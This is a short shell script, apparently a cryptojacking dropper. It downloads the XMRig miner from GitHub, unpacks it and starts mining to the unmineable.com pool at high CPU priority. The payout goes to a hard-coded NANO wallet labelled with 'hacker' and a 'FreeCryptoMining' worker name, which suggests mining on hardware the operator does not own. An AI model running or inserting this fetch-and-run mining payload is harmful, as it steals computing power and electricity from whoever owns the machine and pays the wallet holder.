#!/bin/sh
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o rx.unmineable.com:3333 -u NANO:nano_1hacker1kz4rwm9e6ax8pyd8rpc8ha3amkuar6fu81egek15uzdsbqsjmpbf.FreeCryptoMining -p x --cpu-priority 5 -a rx -k
